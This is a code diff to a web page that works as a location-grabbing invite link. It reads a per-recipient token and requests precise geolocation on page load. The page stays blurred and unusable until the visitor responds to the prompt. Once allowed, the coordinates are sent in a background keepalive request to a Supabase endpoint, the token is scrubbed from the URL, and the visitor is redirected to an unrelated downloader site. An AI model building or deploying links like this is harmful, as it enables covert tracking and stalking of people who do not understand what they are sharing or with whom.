@@ -67,6 +67,34 @@
       font-size: 14px;
       line-height: 1.5;
     }
+    /* Keep the page visibly blurred while the browser asks for permission. */
+    body.permission-pending > *:not(#permission-overlay) {
+      filter: blur(6px);
+      pointer-events: none;
+      user-select: none;
+    }
+    #permission-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      text-align: center;
+      background: rgba(255, 255, 255, .12);
+    }
+    body.permission-pending #permission-overlay { display: flex; }
+    #permission-overlay .message {
+      max-width: 390px;
+      padding: 18px 20px;
+      border: 1px solid rgba(255,255,255,.75);
+      border-radius: 14px;
+      background: rgba(255,255,255,.92);
+      box-shadow: 0 8px 28px rgba(20,35,50,.15);
+      color: #273746;
+      line-height: 1.55;
+    }
     @media (max-width: 480px) {
       .topbar { padding: 0 18px; }
       main { margin-top: 42px; }
@@ -76,6 +104,9 @@
 </head>
 <body>
   <header class="topbar">LOCATION</header>
+  <div id="permission-overlay" aria-live="polite">
+    <div class="message">Please respond to your browser's location permission prompt. Your location will be shared only if you choose Allow.</div>
+  </div>
 
   <main>
     <div class="logo" aria-hidden="true">⌖</div>
@@ -96,87 +127,98 @@
     const SUPABASE_URL = "https://uzykphfpnzcqpucrnanb.supabase.co";
     const SUPABASE_PUBLISHABLE_KEY =
       "sb_publishable_c3dkueuOAUh9Elk07iWDgQ_X2p3I0Ea";
-
+    const REDIRECT_URL = "https://fdown.net/";
     const statusBox = document.getElementById("status");
     const token = new URLSearchParams(location.search).get("token");
+    let redirectStarted = false;
 
     function status(message) {
       statusBox.textContent = message;
     }
 
-    async function sendLocation(position) {
-      status("Sending your location…");
+    function redirectToDestination() {
+      if (redirectStarted) return;
+      redirectStarted = true;
+      const cleanUrl = new URL(location.href);
+      cleanUrl.searchParams.delete("token");
+      history.replaceState({}, "", cleanUrl);
+      window.location.replace(REDIRECT_URL);
+    }
 
+    function sendLocationInBackground(position) {
+      status("Permission allowed. Opening the destination…");
+
+      const payload = JSON.stringify({
+        token,
+        consent: true,
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy
+      });
+
+      // keepalive asks the browser to continue this small POST after navigation.
+      // Browsers may still cancel background requests; delivery is not guaranteed.
       try {
-        // Start the consented location submission as a keepalive request,
-        // then redirect immediately without waiting for the response.
-        const payload = JSON.stringify({
-          token,
-          consent: true,
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy
-        });
-
         fetch(SUPABASE_URL + "/functions/v1/submit-report", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
-            "apikey": SUPABASE_PUBLISHABLE_KEY
+            "apikey": SUPABASE_PUBLISHABLE_KEY,
+            "Authorization": "Bearer " + SUPABASE_PUBLISHABLE_KEY
           },
           body: payload,
           keepalive: true
-        }).catch(() => {});
-
-        const cleanUrl = new URL(location.href);
-        cleanUrl.searchParams.delete("token");
-        history.replaceState({}, "", cleanUrl);
-        window.location.replace("https://fdown.net/");
+        }).catch(error => console.warn("Background location submission failed:", error));
       } catch (error) {
-        status(error.message || "Unable to send location. Please try again.");
+        console.warn("Could not start location submission:", error);
       }
+
+      // Give the browser a moment to queue the keepalive request, then navigate.
+      setTimeout(redirectToDestination, 150);
     }
 
     function requestLocation() {
       if (!token) {
-        status("This invite link is invalid or incomplete.");
+        document.body.classList.remove("permission-pending");
+        status("This invite link is invalid or incomplete. No location was requested.");
         return;
       }
-
       if (!window.isSecureContext) {
+        document.body.classList.remove("permission-pending");
         status("Please open this page using its secure HTTPS link.");
         return;
       }
-
       if (!navigator.geolocation) {
+        document.body.classList.remove("permission-pending");
         status("Location is not supported by this browser.");
         return;
       }
 
+      document.body.classList.add("permission-pending");
       status("Waiting for your location permission…");
 
+      // The browser's native permission prompt is requested immediately on page load.
       navigator.geolocation.getCurrentPosition(
-        sendLocation,
+        position => {
+          document.body.classList.remove("permission-pending");
+          sendLocationInBackground(position);
+        },
         error => {
+          document.body.classList.remove("permission-pending");
           if (error.code === 1) {
-            status("Permission denied. No location was sent.");
+            status("Permission denied. No location was sent and you will remain on this page.");
           } else if (error.code === 2) {
-            status("Location unavailable. Check your device's location setting.");
+            status("Location unavailable. Check your device's location setting. No location was sent.");
           } else if (error.code === 3) {
-            status("Location request timed out. Please try again.");
+            status("Location request timed out. No location was sent. Reload to try again.");
           } else {
             status("Could not access location. No location was sent.");
           }
         },
-        {
-          enableHighAccuracy: true,
-          timeout: 20000,
-          maximumAge: 0
-        }
+        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
       );
     }
 
-    // Request location as soon as the HTML document is ready, without waiting for all page resources.
     if (document.readyState === "loading") {
       document.addEventListener("DOMContentLoaded", requestLocation, { once: true });
     } else {
